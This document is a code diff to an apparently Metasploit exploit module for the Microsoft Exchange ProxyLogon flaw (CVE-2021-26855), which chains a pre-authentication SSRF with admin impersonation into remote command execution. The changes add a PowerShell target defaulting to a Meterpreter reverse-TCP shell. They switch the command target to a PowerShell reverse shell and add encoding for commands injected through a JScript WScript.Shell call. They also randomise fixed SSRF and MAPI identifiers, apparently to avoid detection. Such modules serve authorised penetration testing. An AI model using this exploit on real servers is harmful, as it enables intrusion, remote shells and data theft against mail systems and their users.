@@ -10,6 +10,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::CmdStager
   include Msf::Exploit::FileDropper
+  include Msf::Exploit::Powershell
   include Msf::Exploit::Remote::CheckModule
   include Msf::Exploit::Remote::HttpClient
 
@@ -68,6 +69,17 @@ class MetasploitModule < Msf::Exploit::Remote
         'Privileged' => true,
         'Targets' => [
           [
+            'Windows Powershell',
+            {
+              'Platform' => 'windows',
+              'Arch' => [ARCH_X64],
+              'Type' => :windows_powershell,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
+              }
+            }
+          ],
+          [
             'Windows Dropper',
             {
               'Platform' => 'windows',
@@ -75,7 +87,6 @@ class MetasploitModule < Msf::Exploit::Remote
               'Type' => :windows_dropper,
               'CmdStagerFlavor' => %i[psh_invokewebrequest],
               'DefaultOptions' => {
-                'DisablePayloadHandler' => false,
                 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                 'CMDSTAGER::FLAVOR' => 'psh_invokewebrequest'
               }
@@ -89,7 +100,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'Type' => :windows_command,
               'DefaultOptions' => {
                 'DisablePayloadHandler' => true,
-                'PAYLOAD' => 'cmd/windows/generic'
+                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
               }
             }
           ]
@@ -124,8 +135,13 @@ class MetasploitModule < Msf::Exploit::Remote
     datastore['PAYLOAD'] == 'cmd/windows/generic'
   end
 
+  def encode_cmd(cmd)
+    cmd = cmd.gsub('\\', '\\\\\\')
+    cmd = cmd.gsub('"', '\u0022').gsub('&', '\u0026').gsub('+', '\u002b')
+  end
+
   def execute_command(cmd, _opts = {})
-    cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd}\").StdOut.ReadAll());"
+    cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"#{encode_cmd(cmd)}\").StdOut.ReadAll());"
     send_request_raw(
       'method' => 'POST',
       'uri' => normalize_uri(web_directory, @random_filename),
@@ -155,7 +171,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     response = send_http(
       'POST',
-      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~1942062522",
+      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}",
       data: data,
       cookie: exploit_info[2],
       ctype: 'application/json; charset=utf-8',
@@ -183,12 +199,27 @@ class MetasploitModule < Msf::Exploit::Remote
     sid
   end
 
+  def random_mapi_id
+    id = "{#{Rex::Text.rand_text_hex(8)}"
+    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
+    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
+    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
+    id = "#{id}-#{Rex::Text.rand_text_hex(12)}}"
+    id.upcase
+  end
+
+  def random_ssrf_id
+    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)
+    # max. 2147483647
+    rand(1941962752..2147483647)
+  end
+
   def request_autodiscover(server_name)
     xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }
 
     response = send_http(
       'POST',
-      "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522",
+      "#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}",
       data: soap_autodiscover,
       ctype: 'text/xml; charset=utf-8'
     )
@@ -221,16 +252,16 @@ class MetasploitModule < Msf::Exploit::Remote
   def request_mapi(server_name, legacy_dn, server_id)
     data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
     headers = {
-      'X-Requesttype' => 'Connect',
-      'X-Clientinfo' => '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
-      'X-Clientapplication' => datastore['MapiClientApp'],
-      'X-Requestid' => '{C715155F-2BE8-44E0-BD34-2960067874C8}:2'
+      'X-RequestType' => 'Connect',
+      'X-ClientInfo' => random_mapi_id,
+      'X-ClientApplication' => datastore['MapiClientApp'],
+      'X-RequestId' => "#{random_mapi_id}:#{Rex::Text.rand_text_numeric(5)}"
     }
 
     sid = ''
     response = send_http(
       'POST',
-      "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522",
+      "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~#{random_ssrf_id}",
       data: data,
       ctype: 'application/mapi-http',
       headers: headers
@@ -259,7 +290,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     response = send_http(
       'POST',
-      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~1942062522",
+      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~#{random_ssrf_id}",
       data: data,
       cookie: session,
       ctype: 'application/json; charset=utf-8',
@@ -288,7 +319,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     response = send_http(
       'POST',
-      "Admin@#{server_name}:444/ecp/proxyLogon.ecp?a=~1942062522",
+      "Admin@#{server_name}:444/ecp/proxyLogon.ecp?a=~#{random_ssrf_id}",
       data: data,
       ctype: 'text/xml; charset=utf-8',
       headers: {
@@ -307,7 +338,7 @@ class MetasploitModule < Msf::Exploit::Remote
   # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.
   def run_cve_2021_26855
     # request for internal server name.
-    response = send_http(datastore['METHOD'], 'localhost~1942062522')
+    response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
     if response.code != 500 || !response.headers.to_s.include?('X-FEServer')
       fail_with(Failure::NotFound, 'No \'X-FEServer\' was found')
     end
@@ -473,7 +504,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
     response = send_http(
       'POST',
-      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~1942062522",
+      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}",
       data: data,
       cookie: exploit_info[2],
       ctype: 'application/json; charset=utf-8',
@@ -512,16 +543,14 @@ class MetasploitModule < Msf::Exploit::Remote
     # trigger powa!
     case target['Type']
     when :windows_command
-      if cmd_windows_generic?
-        vprint_status("Generated payload: #{payload.encoded}")
+      vprint_status("Generated payload: #{payload.encoded}")
+
+      if !cmd_windows_generic?
+        execute_command(payload.encoded)
+      else
+        response = execute_command("cmd /c #{payload.encoded}")
 
         print_warning('Dumping command output in response')
-
-        cmd = payload.encoded
-        cmd = cmd.gsub('\\', '\\\\\\').gsub('&', '\u0026')
-        cmd = cmd.gsub('"', '\\"')
-        response = execute_command(cmd)
-
         output = response.body.split('Name                            :')[0]
         if output.empty?
           print_error('Empty response, no command output')
@@ -530,7 +559,9 @@ class MetasploitModule < Msf::Exploit::Remote
         print_line(output)
       end
     when :windows_dropper
-      cmd = generate_cmdstager[0].gsub('\\', '\\\\\\').gsub('&', '\u0026')
+      execute_command(generate_cmdstager.join())
+    when :windows_powershell
+      cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)
       execute_command(cmd)
     end
   end
